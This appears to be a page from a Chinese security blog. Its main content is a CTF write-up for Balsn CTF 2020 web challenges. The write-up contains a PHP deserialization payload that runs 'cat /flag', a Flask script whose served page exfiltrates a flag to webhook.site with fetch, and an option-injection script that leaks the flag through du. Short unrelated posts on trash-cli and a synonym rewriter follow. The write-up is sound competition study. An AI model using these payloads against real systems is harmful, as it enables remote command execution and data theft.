+<p>「Taking L5D was a profound experience, one of the most important things in my life.」</p>
+<p>Try this new Unserialize-Oriented Programming System a.k.a. L5D !</p>
+<p><a target="_blank" rel="noopener" href="http://l5d.balsnctf.com:12345/index.php">http://l5d.balsnctf.com:12345/index.php</a></p>
+<p>PHP Version: 7.0.33</p>
+<p>Author: kaibro</p>
+</blockquote>
+<p>题目提供了源码，阅读后发现以下可能作为关键点的地方：</p>
+<p>变量覆盖：</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142917.jpg" alt="image6765"></p>
+<p>任意命令执行：</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142948.jpg" alt="image6899"></p>
+<p>修改全局变量cmd</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116143051.jpg" alt="image7035"></p>
+<p>但是题目给反序列化的数据加上了一个限制：不能出现<code>*</code>(protect变量就需要<code>*</code>号)</p>
+<p>实际测试一下发现，并不能用public,private的同名变量来代替protect变量，这是难点一</p>
+<p>还有就是其他类的<code>__wakeup</code>方法会禁止我们通过L5D_Upload来任意变量覆盖，然后L5D_Upload又必须在其他的<code>__destruct</code>方法前执行，这是难点二</p>
+<p>难点二我们可以通过最后一个调用L5D_Upload的<code>__wakeup</code>，第一个调用它的<code>__destruct</code>来绕过，因为<code>__wakeup</code>的调用顺序是从里到外，从前到后，<code>__destruct</code>的调用顺序是从外到内，从前到后，所以构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding = <span class="keyword">new</span> L5D_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding=<span class="keyword">new</span> L5D_Command();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Command</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> L5D_Upload();</span><br></pre></td></tr></table></figure>
+
+<p>接着就是难点一了，对<code>*</code>号的禁用导致我们不能直接反序列化一个protect属性的成员</p>
+<p>但是我们可以用大写S来绕过：</p>
+<p>可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;L5D_ResetCMD&quot;:2:&#123;s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:&#123;&#125;S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样new_cmd就是protect属性了</p>
+<p>最后的exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding = <span class="keyword">new</span> L5D_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding=<span class="keyword">new</span> L5D_Command();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Command</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=str_replace(<span class="string">&#x27;s:10:&quot;&#x27;</span>.<span class="string">&quot;\x00*\x00&quot;</span>,<span class="string">&#x27;S:10:&quot;\00\2a\00&#x27;</span>,serialize(<span class="keyword">new</span> L5D_Upload()));</span><br><span class="line"><span class="keyword">echo</span> urlencode (<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="the-woven-web"><a href="#the-woven-web" class="headerlink" title="the woven web"></a>the woven web</h2><p>看了<a target="_blank" rel="noopener" href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py">Super⚔️Blue</a> 的wp，只能说一句牛逼</p>
+<p>其实原理很简单：让浏览器自动下载一个文件，然后file协议访问那个文件，那个文件就可以引用server.js，于是就有flag的值了</p>
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.html&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    r = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            function require(a)&#123;</span></span><br><span class="line"><span class="string">                if(a==&quot;express&quot;)&#123;return ()=&gt;&#123;return &#123;get:function()&#123;&#125;,listen:function()&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                if(a==&quot;redis&quot;)&#123;</span></span><br><span class="line"><span class="string">                    return &#123;createClient:function()&#123;&#125;&#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                if(a==&quot;fs&quot;)&#123;</span></span><br><span class="line"><span class="string">                    return &#123;existsSync:function()&#123;&#125;&#125;;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;script src=&quot;../app/server.js&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            fetch(&quot;https://webhook.site/X?a=&quot;+FLAG);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r,&#123;<span class="string">&quot;Content-Disposition&quot;</span>:<span class="string">&#x27;attachment; filename=&quot;wtf22.html&quot;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__==<span class="string">&quot;__main__&quot;</span>):</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">4000</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Windows-XP-Media-Player"><a href="#Windows-XP-Media-Player" class="headerlink" title="Windows XP Media Player"></a>Windows XP Media Player</h2><p>还是看了<a target="_blank" rel="noopener" href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py">Super⚔️Blue</a> 的wp</p>
+<p>应该静下心来做的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;windows-xp-media-player.balsnctf.com&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">s, path</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">&quot;http://&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(host, path))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s1 = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create a session</span></span><br><span class="line">    resp = req(s1, <span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use create playlist to generate the command `mkdir -p ./--output=/tmp/vakzz_in` </span></span><br><span class="line">    req(s1, <span class="string">&quot;/?args=-p ./--output=/tmp/vakzz_in&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># also create a `-z` folder</span></span><br><span class="line">    req(s1, <span class="string">&quot;/?args=./-z&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use `--` so that the remaining args are not treated as options, will run `ls -- -z --output=/tmp/vakzz_in /flag/`</span></span><br><span class="line">    <span class="comment"># since all of these folders exist ls will exit cleanly and add our args to the queue</span></span><br><span class="line">    req(s1, <span class="string">&quot;/q/add?args=-- -z --output=/tmp/vakzz_in /flag/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># remove the `--` from the queue</span></span><br><span class="line">    req(s1, <span class="string">&quot;/q/skip&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shuffle the queue which will run `shuf -e -z --output=/tmp/vakzz_in /flag/`</span></span><br><span class="line">    <span class="comment"># this writes final argument as a null terminated string to the specified output file</span></span><br><span class="line">    req(s1, <span class="string">&quot;/q/shuf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now /tmp/vakzz_in contains `/flag/\x00`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rate limit</span></span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># new session as need more playlists</span></span><br><span class="line">    s2 = requests.Session()</span><br><span class="line">    resp = req(s2, <span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create the folder `--files0-from=/tmp/vakzz_in` for option injection</span></span><br><span class="line">    req(s2, <span class="string">&quot;/?args=-p ./--files0-from=/tmp/vakzz_in&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create the folder `--exclude=flag?[1-9]*` for option injection</span></span><br><span class="line">    req(s2, <span class="string">&quot;/?args=./--exclude=flag?[1-9]*&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now `--files0-from=/tmp/vakzz_in` and `--exclude=flag?[1-9]*` are both in the names array and can be used in args</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># use stat to run `du` with our injection options, causing it to look at folders from /tmp/vakzz_in and exclude</span></span><br><span class="line">    <span class="comment"># anything that matches the supplied pattern: `du -sh --files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*`</span></span><br><span class="line">    resp = req(s2, <span class="string">&quot;/?args=--files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*&amp;op=stat&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if the flag was excluded then this will return `8.0K    /flag/` otherwise `16K    /flag/`, letting us know if </span></span><br><span class="line">    <span class="comment"># the flag starts with 0-9 or a-f.</span></span><br><span class="line">    <span class="built_in">print</span>(resp.text.split(<span class="string">&#x27;&lt;div class=&quot;field-row&quot;&gt;&lt;label&gt;&#x27;</span>)[<span class="number">2</span>].split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化在禁止\x00和*时，我们可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;L5D_ResetCMD&quot;:2:&#123;s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:&#123;&#125;S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="cku89gxsq0001wvos53nncpv8" data-title="2020 balsn ctf web 部分题解" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-避免rm-rf-的悲惨命运" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" class="article-date">
+  <time class="dt-published" datetime="2020-02-17T21:44:07.000Z" itemprop="datePublished">2020-02-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">避免rm -rf *的悲惨命运</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="避免rm-rf-的悲惨命运"><a href="#避免rm-rf-的悲惨命运" class="headerlink" title="避免rm -rf *的悲惨命运"></a>避免rm -rf *的悲惨命运</h1><p>今天又是悲惨的一天,没认真看,rm -rf *错地方了</p>
+<p>为了再次避免悲惨命运</p>
+<ol>
+<li><p>还是不要老是用root用户了,创个日常的低权限用户,有必要时再登陆root</p>
+</li>
+<li><p>别用rm 啦,改用trash吧</p>
+</li>
+</ol>
+<h2 id="安装trash-cli"><a href="#安装trash-cli" class="headerlink" title="安装trash-cli"></a>安装trash-cli</h2><p><code>apt-get install trash-cli</code></p>
+<p><code>echo alias rm=trash &gt;&gt; ~/.zshrc</code></p>
+<p><code>source ~/.zshrc</code> </p>
+<h2 id="trash-cli-命令"><a href="#trash-cli-命令" class="headerlink" title="trash-cli 命令"></a>trash-cli 命令</h2><table>
+<thead>
+<tr>
+<th>command</th>
+<th>explain</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>trash-put/trash</td>
+<td>将文件或目录放进回收站</td>
+</tr>
+<tr>
+<td>trash-empty</td>
+<td>清空回收站</td>
+</tr>
+<tr>
+<td>trash-list</td>
+<td>列出回收站中的文件</td>
+</tr>
+<tr>
+<td>restore-trash</td>
+<td>还原回收站中的文件</td>
+</tr>
+<tr>
+<td>trash-rm</td>
+<td>删除回收站中的单个文件</td>
+</tr>
+</tbody></table>
+<h2 id="垃圾站所在位置"><a href="#垃圾站所在位置" class="headerlink" title="垃圾站所在位置"></a>垃圾站所在位置</h2><p><code>~/.local/share/Trash/files</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" data-id="cku89gxw10084wvosfw4pbfza" data-title="避免rm -rf *的悲惨命运" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-勉强能用的论文降重" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/" class="article-date">
+  <time class="dt-published" datetime="2019-12-15T18:38:45.000Z" itemprop="datePublished">2019-12-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">勉强能用的论文降重</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="勉强能用的论文降重"><a href="#勉强能用的论文降重" class="headerlink" title="勉强能用的论文降重"></a>勉强能用的论文降重</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) !=<span class="number">2</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Usage: %s inputfile outputfile&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">	exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> synonyms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f=sys.argv[<span class="number">1</span>]</span><br><span class="line">s=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(f,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fl:</span><br><span class="line">	s=fl.read()</span><br><span class="line">resstr,stype=synonyms.seg(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">2</span>],<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> resstr:</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(i)==<span class="number">1</span>:</span><br><span class="line">			fw.write(i)</span><br><span class="line">		<span class="keyword">else</span> :</span><br><span class="line">			nearbystr,num=synonyms.nearby(i)</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(nearbystr)&gt;<span class="number">1</span> <span class="keyword">and</span> num[<span class="number">1</span>]&gt; <span class="number">0.75</span>:</span><br><span class="line">				<span class="built_in">print</span>(nearbystr[<span class="number">1</span>],num[<span class="number">1</span>])</span><br><span class="line">				fw.write(nearbystr[<span class="number">1</span>])</span><br><span class="line">			<span class="keyword">else</span> :</span><br><span class="line">				fw.write(i)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以调整<code>if len(nearbystr)&gt;1 and num[1]&gt; 0.75:</code>来修改近义词的准确率.</p>
+<p>用完之后一定要自己校对一遍!!!不然…..</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/" data-id="cku89gxvp0071wvos93br3bce" data-title="勉强能用的论文降重" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/8/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" 